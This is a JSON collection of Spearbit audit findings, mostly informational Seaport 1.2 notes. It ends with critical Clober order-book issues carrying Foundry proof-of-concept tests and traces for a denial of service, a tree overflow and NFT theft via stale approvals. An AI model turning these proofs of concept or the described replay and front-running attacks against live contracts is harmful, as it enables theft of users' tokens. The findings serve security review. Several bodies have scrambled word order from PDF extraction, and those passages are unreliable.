        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ceivedItem.recipient's offset of considerationItemPtr to write to receivedItem at offset (the same offset is also used here): _aggregateValidFulfillmentConsiderationItems are we In the Re- the same // Set the recipient on the received item. mstore( add(receivedItem, ReceivedItem_recipient_offset), mload(add(considerationItemPtr, ReceivedItem_recipient_offset)) ) looks buggy, This tion[i].endAmount with consideration[i].recipient: but in _validateOrdersAndPrepareToFulfill(...) we overwrite considera- mstore( add( considerationItem, ReceivedItem_recipient_offset // old endAmount ), mload( add( considerationItem, ConsiderationItem_recipient_offset ) ) ) in _fulfillAvailableAdvancedOrders and Also _validateOrdersAndPrepareToFulfill gets called first _matchAdvancedOrders. This is important since the memory for the consideration arrays needs to be updated before we reach _aggregateValidFulfillmentConsiderationItems. 59",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "recipient is provided as the fulfiller for the OrderFulfilled event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the above context in general it is not true that the recipient is the fulfiller. Also note that recipient is address(0) for match orders.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "availableOrders[i] return values need to be explicitly assigned since they live in a region of memory which might have been dirtied before",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport 1.1 did not have the following default assignment: if (advancedOrder.numerator == 0) { availableOrders[i] = false; continue; } But this is needed here since the current memory region which was previously used by the accumulator might be dirty.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of MemoryPointer / formatting inconsistent in _getGeneratedOrder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Usage of MemoryPointer / formatting is inconsistent between the loop used OfferItems and the loop used for ConsiderationItems.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "newAmount is not used in _compareItems",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "newAmount is unused in _compareItems. If originalItem points to I = (t, T , i, as, ae) and the newItem to Inew = (t 0, T 0, i 0, a0 s, a0 e) where parameter description t 0 t T , T 0 i 0 i as, a0 s ae, a0 e c then we have itemType itemType for I after the adjustment for restricted collection items token identifierOrCriteria identifierOrCriteria for I after the adjustment for restricted collection items startAmount endAmount _compareItems c(I, Inew ) = (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) and so we are not comparing either as to a0 enforced. In _getGeneratedOrder we have the following check: as > a0 errorBuffer. inequality is reversed for consideration items). And so in each loop (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) _ (as > a0 s or a0 s to a0 e. In abi_decode_generateOrder_returndata a0 s = a0 e is s (invalid case for offer items that contributes to s) is ored to errorBuffer.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "reformat validate so that its body is consistent with the other external functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "For consistency with other functions we can rewrite validate as: function validate( Order[] calldata /* orders */ ) external override returns (bool /* validated */ ) { return _validate(to_dyn_array_Order_ReturnType( abi_decode_dyn_array_Order )(CalldataStart.pptr())); } Needs to be checked if it changes code size or gas cost. Seaport: Fixed in PR 824. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add commented parameter names (Type Location /* name */)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Add commented parameter names (Type Location /* name */) for validate: Order[] calldata /* orders */ Seaport: Fixed in commit 74de34. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document that the height provided to _lookupBulkOrderTypehash can only be in a certain range",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Need to have height h provided to _lookupBulkOrderTypehash such that: 1 + 32(h (cid:0) 1) 2 [0, min(0xffffffffffffffff, typeDirectory.codesize) (cid:0) 32] Otherwise typeHash := mload(0) would be 0 or would be padded by zeros. When extcodecopy gets executed extcodecopy(directory, 0, typeHashOffset, 0x20) clients like geth clamp typehashOffset to minimum of 0xffffffff_ffffffff and directory.codesize and pads the result with 0s if out of range. ref:  instructions.go#L373 62  common.go#L54",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused imports can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The imported contents in this context are unused.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "msg.sender is provided as the fulfiller input parameter in a few locations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "msg.sender is provided as the fulfiller input parameter.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences and similarities of ConsiderationDecoder and solc when decoding dynamic arrays of static/fixed base struct type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The way OfferItem[] in abi_decode_dyn_array_OfferItem and ConsiderationItem[] in abi_- decode_dyn_array_ConsiderationItem are decoded are consistent with solc regarding this:  For dynamic arrays of static/fixed base struct type, the memory region looks like: 63 [mPtrLength --------------------------------------------------- [mPtrLength + 0x20: mPtrLength + 0x40) : mPtrLength + 0x20) arrLength memberTail1 - a memory pointer to the array's 1st element ,! ... [mPtrLength + ...: mPtrLength + ...) memberTailN - a memory pointer to the array's Nth element ,! --------------------------------------------------- [memberTail1 ... [memberTailN : memberTail1 + <STRUCT_SIZE>) element1 : memberTailN + <STRUCT_SIZE>) elementN The difference is solc decodes and validates (checking dirty bytes) each field of the elements of the array (which are static struct types) separately (one calldataload and validation per field per element). ConsiderationDecoder skips all those validations for both OfferItems[] and ConsiderationItems[] by copying a chunk of calldata to memory (the tail parts): calldatacopy( mPtrTail, add(cdPtrLength, 0x20), mul(arrLength, OfferItem_size) ) That means for OfferItem[], itemType and token (and also recipient for ConsiderationItem[]) fields can potentially have dirty bytes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "PointerLibraries's malloc skips some checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "malloc in PointerLibraries skips checking if add(mPtr, size) is OOR or wraps around. Solidity does the following when allocating memory: 64 function allocate_memory(size) -> memPtr { memPtr := allocate_unbounded() finalize_allocation(memPtr, size) } function allocate_unbounded() -> memPtr { memPtr := mload(<freeMemoryPointer>) } function finalize_allocation(memPtr, size) { let newFreePtr := add(memPtr, round_up_to_mul_of_32(size)) // protect against overflow if or(gt(newFreePtr, 0xffffffff_ffffffff), lt(newFreePtr, memPtr)) { // <-- the check that is skipped panic_error_<code>() } mstore(<freeMemoryPointer>, newFreePtr) } function round_up_to_mul_of_32(value) -> result { result := and(add(value, 31), not(31)) } function panic_error_<code>() { // <selector> = cast sig \"Panic(uint256)\" mstore(0, <selector>) mstore(4, <code>) revert(0, 0x24) } Also note, rounding up the size to the nearest word boundary is hoisted out of malloc.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_decode_bytes can populate memory with dirty bytes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When abi_decode_bytes decodes bytes, it rounds its size and copies the rounded size from calldata to memory. This memory region might get populated with dirty bytes. So for example: For both signature and extraData we are using abi_decode_bytes. If the AdvancedOrder is tightly packed and:  If signature's length is not a multiple of a word (0x20) part of the extraData.length bytes will be copied/duplicated to the end of signature's last memory slot.  If extraData's length is not a multiple of a word (0x20) part of the calldata that comes after extraData's tail will be copied to memory. Even if AdvancedOrder is not tightly packed (tail offsets are multiple of a word relative to the head), the user can stuff the calldata with dirty bits when signature's or extraData's length is not a multiple of a word. And those dirty bits will be carried over to memory during decoding. Note, these extra bits will not be overridden or 65 cleaned during the decoding because of the way we use and update the free memory pointer (incremented by the rounded-up number to a multiple of a word).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_encode_validateOrder reuses a memory region",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "It is really important to note that before abi_encode_validateOrder is called, _prepareBasicFul- fillmentFromCalldata(...) needs to be called to populate the memory region that is used for event OrderFul- filled(...) which can be reused/copied in this function: MemoryPointer.wrap(offerDataOffset).copy( dstHead.offset(tailOffset), offerAndConsiderationSize ); From when the memory region for OrderFulfilled(...) is populated till we reach this point, care needs to be taken to not modified that region. accumulator data is written to the memory after that region and the current implementation does not touch that region during the whole call after the event has been emitted.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_encode_validateOrder writes to a memory region that might have been potentially dirtied by accumulator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In abi_encode_validateOrder potentially (in the future), we might be writing in an area where accumulator was used. And since the book-keeping for the accumulator does not update the free memory pointer, we need to make sure all bytes in the memory in the range [dst, dst+size) are fully updated/written to in this function.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder writing to memory in ConsiderationEncoder to follow the order in struct definitions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Reorder the memory writes in ConsiderationEncoder to follow the order in struct definitions.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The compiled YUL code includes redundant consecutive validation of enum types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Half the location where an enum type struct field has been used/accessed, the validation function for this enum type is performed twice: validator_assert_enum_<ENUM_NAME>(memPtr) validator_assert_enum_<ENUM_NAME>(memPtr)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing tests for revert functions in ConsiderationErrors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ConsiderationErrors.sol is a new file and is untested. Writing test cases to make sure the revert functions are throwing the right errors is an easy way to prevent mistakes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo in comment for the selector used in ConsiderationEncoder.sol#abi_encode_validateOrder()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Minor typo in comments: // Write ratifyOrder selector and get pointer to start of calldata dst.write(validateOrder_selector);",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constrainsts.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constraints. This is the case when errorBuffer !=0 and revertOnInvalid == false (ful- fillAvailableOrders, fulfillAvailableAdvancedOrders). In this case, Seaport would not call back into the contract offerer's ratifyOrder(...) endpoint. Thus, the next time this offerer receives a ratifyOrder(...) call from Seaport, the nonce shared with it might have incremented more than 1.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users need to be cautious about what proxied/modified Seaport or Conduit instances they approve their tokens to",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport ( S ) uses EIP-712 domain separator to make sure that when users sign orders, the signed orders only apply to that specific Seaport by pinpointing its name, version, the chainid, and its address. The domain separator is calculated and cached once the Seaport contract gets deployed. The domain separator only gets recalculated when/if the chainid changes (in the case of a hard fork for example). Some actors can take advantage of this caching mechanism by deploying a contract ( S0 ) that :  Delegates some of its endpoints to Seaport or it's just a proxy contract.  Its codebase is almost identical to Seaport except that the domain separator actually replicates what the original Seaport is using. This only requires 1 or 2 lines of code change (in this case the caching mechanism is not important) function _deriveDomainSeparator() { ... // Place the address of this contract in the next memory location. mstore(FourWords, MAIN_SEAPORT_ADDRESS) // <--- modified line and perhaps the actor can define a ,! named constant Assume a user approves either: 1. Both the original Seaport instance and the modified/proxied instance or, 2. A conduit that has open channels to both the original Seaport instance and the modified/proxied instance. And signs an order for the original Seaport that in the 1st case doesn't use any conduits or in the 2nd case the order uses the approved conduit with 2 open channels. Then one can use the same signature once with the original Seaport and once with the modified/proxied one to receive more tokens than offerer / user originally had intended to sell.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "ZoneInteraction contains logic for both zone and contract offerers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ZoneInteraction contains logic for both zone and contract offerers.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Orders of CONTRACT order type can lower the value of a token offered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Sometimes tokens have extra value because of the derived tokens owned by them (for example an accessory for a player in a game). With the introduction of contract offerer, one can create a contract offerer that automatically lowers the value of a token, for example, by transferring the derived connected token to a different item when Seaport calls the generateOrder(...). When such an order is included in a collection of orders the only way to ensure that the recipient of the item will hold a token which value hasn't depreciated during the transaction is that the recipient would also need to use a kind of mirrored order that incorporates either a CONTRACT or restricted order type that can do a post-transfer check.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restricted order checks in case where offerer and the fulfiller are the same",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport 1.2 disallowed skipping restricted order checks when offerrer and fulfiller are the same.  Remove special-casing for offerer-fulfilled restricted orders: Offerers may currently bypass restricted order checks when fulfilling their own orders. This complicates reasoning about restricted order validation, can aid in the deception of other offerers or fulfillers in some unusual edge cases, and serves little practical use. However, in the case of the offerer == fulfiller == zone, the check continues to be skipped.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clean up inline documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The comments highlighted in Context need to be removed or updated.  Remove the following: 73 ConsiderationEncoder.sol:216: // @todo Dedupe some of this ConsiderationEncoder.sol:316: // @todo Dedupe some of this ZoneInteraction.sol:97: // bytes memory callData; ZoneInteraction.sol:100: // function(bytes32) internal view errorHandler; ZoneInteraction.sol:182: // let magicValue := shr(224, mload(callData))  ConsiderationStructs.sol#L167 and ZoneInteraction.sol#L82 contain an outdated comment about the extraData attribute. There is no longer a staticcall being done, and the function isValidOrderIn- cludingExtraData no longer exists.  The NatSpec comment for _assertRestrictedAdvancedOrderValidity mentions: /** * @dev Internal view function to determine whether an order is a restricted * * * * * order and, if so, to ensure that it was either submitted by the offerer or the zone for the order, or that the zone returns the expected magic value upon performing a staticcall to `isValidOrder` or `isValidOrderIncludingExtraData` depending on whether the order fulfillment specifies extra data or criteria resolvers. A few of the facts are not correct anymore: * This function is not a view function anymore and change the storage state either for a zone or a contract offerer. * It is not only for restricted orders but also applies to orders of CONTRACT order type. * It performs actuall calls and not staticcalls anymore. * it calls the isValidOrder endpoint of a zone or the ratifyOrder endpoint of a contract offerer depending on the order type. * If it is dealing with a restricted order, the check is only skipped if the msg.sender is the zone. Seaport is called by the offerer for a restricted order, the call to the zone is still performed. If  Same comments apply to _assertRestrictedBasicOrderValidity excluding the case when order is of CONTRACT order type.  Typos in TransferHelperErrors.sol - * @dev Revert with an error when a call to a ERC721 receiver reverts with + * @dev Revert with an error when a call to an ERC721 receiver reverts with  The @ NatSpec fields have an extra space in Consideration.sol: * @ <field> The extra space can be removed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing tests for hard coded constants in ConsiderationConstants.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There are many hard coded constants, most being function selectors, that should be tested against.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused / Redundant imports in ZoneInteraction.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There are multiple unused / redundant imports.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Orders of CONTRACT order type do not enforce a usage of a specific conduit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "None of the endpoints (generateOrder and ratifyOrder) for an order of CONTRACT order type en- force using a specific conduit. A contract offerer can enforce the usage of a specific conduit or just Seaport by setting allowances or approval for specific tokens. If a caller calls into different Seaport endpoints and does not provide the correct conduit key, then the order would revert. Currently, the ContractOffererInterface interface does not have a specific endpoint to discover which conduits the contract offerer would prefer users to use. getMetadata() would be able to return a metadata that encodes the conduit key. For (advanced) orders of not CONTRACT order types, the offerer would sign the order and the conduit key is included in the signed hash. Thus, the conduit is enforced whenever that order gets included in a collection by an actor calling Seaport.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items. These endpoints include:  fulfillAvailableOrders  fulfillAvailableAdvancedOrders  matchOrders  matchAdvancedOrders Anyone can monitor the mempool to find calls to the above endpoints and calculate if there are any unused offer item amounts. If there are unused offer item amounts, the actor can create orders with no offer items, but with consideration items mirroring the unused offer items and populate the fulfillment aggregation data to match the 84 unused offer items with the new mirrored consideration items. It is possible that the call by the actor would be successful under certain conditions. For example, if there are orders of CONTRACT order type involved, the contract offerer might reject this actor (the rejection might also happen by the zones used when validating the order). But in general, this strategy can be implemented by anyone.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with more offer items and the extra offer items might not end up being used.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide extra offer items for this order. These extra offer items might have not been known beforehand by the caller. And if the caller would not incorporate the indexes for the extra items in the fulfillment aggregation data, the extra items would end up not being aggregated into any executions.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo for the index check comment in _aggregateValidFulfillmentConsiderationItems",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There is a typo in _aggregateValidFulfillmentConsiderationItems: // Retrieve item index using an offset of the fulfillment pointer. let itemIndex := mload( add(mload(fulfillmentHeadPtr), Fulfillment_itemIndex_offset) ) // Ensure that the order index is not out of range. <---------- the line with typo if iszero(lt(itemIndex, mload(considerationArrPtr))) { throwInvalidFulfillmentComponentData() } The itemIndex above refers to the index in consideration array and not the order.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the unused parameters for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "If an advance order advancedOrder is of CONTRACT order type, certain parameters are not being used in the code base, specifically:  numerator: only used for skipping certain operations (see AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT order type)  denominator: --  signature: --  parameters.zone: only used when emitting the OrderFulfilled event.  parameters.offer.endAmount: endAmount and startAmount for offer items will be set to the amount sent back by generateOrder for the corresponding item.  parameters.consideration.endAmount: endAmount and startAmount for consideration items will be set to the amount sent back by generateOrder for the corresponding item  parameters.consideration.recipient: the offerer contract returns new recipients when generateOrder gets called  parameters.zoneHash: --  parameters.salt: --  parameters.totalOriginalConsiderationItems: --",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The check against totalOriginalConsiderationItems is skipped for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "compares dOrder.parameters.consideration.length: The AdvancedOrder.parameters.totalOriginalConsiderationItems inequality following skipped orders for of is CONTRACT order with type which Advance- // Ensure supplied consideration array length is not less than the original. if (suppliedConsiderationItemTotal < originalConsiderationItemTotal) { _revertMissingOriginalConsiderationItems(); }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "getOrderStatus returns the default values for orderHash that is derived for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Since the _orderStatus[orderHash] does not get set for orders of CONTRACT order type, getOrder- Status would always returns (false, false, 0, 0) for those hashes (unless there is a hash collision with other types of orders)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "validate skips CONTRACT order types but cancel does not",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When validating orders validate skips any order of CONTRACT order type, but cancel does not skip these order types. When fulfilling or matching orders for CONTRACT order types, _orderStatus does not get checked or populated. But in cancel the isValidated and the isCancelled fields get set. This is basically a no-op for these order types.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The literal 0x1c used as the starting offset of a custom error in a revert statement can be replaced by the named constant Error_selector_offset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the context above, 0x1c is used to signal the start of a custom error block saved in the memory: revert(0x1c, _LENGTH_) For the above literal, we also have a named constant defined in ConsiderationConstants.sol#L410: uint256 constant Error_selector_offset = 0x1c; The named constant Error_selector_offset has been used in most places that a custom error is reverted in an assembly block.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "OrderBook Denial of Service leveraging blacklistable tokens like USDC",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The issue was spotted while analysing additional impact and fix for 67 Proof of concept checked with the original audit commit: 28062f477f571b38fe4f8455170bd11094a71862 and the newest available commit from dev branch: 2ed4370b5de9cec5c455f5485358db194f093b01 Due to the architecture decision which implements orders queue as a cyclic buffer the OrderBook after reaching MAX_ORDERS (~32k) for a given price point, starts to overwrite stale orders. If an order was never claimed or it is broken, so it cannot be claimed, it is not possible to place a new order in a queue. This emerges due to a fact that it is not possible to finalize the stale order and deliver the underlying assets, what is done while placing a new and replacing a stale order. Effectively this issue can be used to block the main functionality of the OrderBook, so placing new orders for a given price point. Only a single broken order per price-point is enough to lead to this condition. The issue will not be immediately visible as it requires the cyclic buffer to make a circle and encounter the broken order. The proof of concept in SecurityAuditTests.sol attachment implements a simple scenario where a USDC-like mock token is used: 1. Mallory creates one ASK order at some price point (to sell X base tokens for Y quoteTokens). 2. Mallory transfers ownership of the OrderNFT token to an address which is blacklisted by quoteToken (e.g. USDC) 3. Orders queue implemented as a circular buffer over time overflows and starts replacing old orders. 4. When it is the time to replace the order the quoteToken is about to be transferred, but due to the blacklist the assets cannot be delivered. 5. At this point it is impossible to place new orders at this price index, unless the owner of the OrderNFT transfers it to somebody who can receive quoteToken. Proof of concept result for the newest 2ed4370b5de9cec5c455f5485358db194f093b01 commit: # $ git clone ... && git checkout 2ed4370b5de9cec5c455f5485358db194f093b01 # $ forge test -m \"test_security_BlockOrderQueueWithBlacklistableToken\" [25766] MockOrderBook::limitOrder(0x0000000000000000000000000000000000004444, 3, 0, ,! 333333333333333334, 2, 0x) [8128] OrderNFT::onBurn(false, 3, 0) [1448] MockOrderBook::getOrder((false, 3, 0)) [staticcall]  (1, 0, 0x00000000000000000000000000000000DeaDBeef) emit Approval(owner: 0x00000000000000000000000000000000DeaDBeef, approved: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888) emit Transfer(from: 0x00000000000000000000000000000000DeaDBeef, to: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888)  () emit ClaimOrder(claimer: 0x0000000000000000000000000000000000004444, user: 0x00000000000000000000000000000000DeaDBeef, rawAmount: 1, bountyAmount: 0, orderIndex: 0, priceIndex: 3, isBase: false) [714] MockSimpleBlockableToken::transfer(0x00000000000000000000000000000000DeaDBeef, 10000) ,! ,! ,! ,! ,! ,!  \"blocked\"  \"blocked\"  \"blocked\" 5 In real life all *-USDC and USDC-* pairs as well as other pairs where a single token implements a block list are affected. The issue is also appealing to the attacker as at any time if the attacker controls the blacklisted wallet address, he/she can transfer the unclaimable OrderNFT to a whitelisted address to claim his/her assets and to enable processing until the next broken order is placed in the cyclic buffer. It can be used either to manipulate the market by blocking certain types of orders per given price points or simply to blackmail the DAO to resume operations.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Overflow in SegmentedSegmentTree464",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core). However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe: function total(Core storage core) internal view returns (uint64) { return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C) + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C); } The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users. 6 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"forge-std/StdJson.sol\"; import \"../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol\"; contract SegmentedSegmentTree464Test is Test { using stdJson for string; uint32 private constant _MAX_ORDER = 2**15; SegmentedSegmentTree464Wrapper testWrapper; function setUp() public { testWrapper = new SegmentedSegmentTree464Wrapper(); } function testTotalOverflow() public { uint64 half64 = type(uint64).max / 2 + 1; testWrapper.update(0, half64); // map to the right node of layer 0, group 0 testWrapper.update(_MAX_ORDER / 2 - 1, half64); assertEq(testWrapper.total(), 0); } }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OrderNFT theft due to controlling future and past tokens of same order index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function. function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) { return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M]; } CloberOrderBook(market).getOrder(decodeId(tokenId)).owner Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens. 7 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol\"; import \"../../../../contracts/mocks/MockQuoteToken.sol\"; import \"../../../../contracts/mocks/MockBaseToken.sol\"; import \"../../../../contracts/mocks/MockOrderBook.sol\"; import \"../../../../contracts/markets/VolatileMarket.sol\"; import \"../../../../contracts/OrderNFT.sol\"; import \"../utils/MockingFactoryTest.sol\"; import \"./Constants.sol\"; contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest { struct Return { address tokenIn; address tokenOut; uint256 amountIn; uint256 amountOut; uint256 refundBounty; } struct Vars { uint256 inputAmount; uint256 outputAmount; uint256 beforePayerQuoteBalance; uint256 beforePayerBaseBalance; uint256 beforeTakerQuoteBalance; uint256 beforeOrderBookEthBalance; } 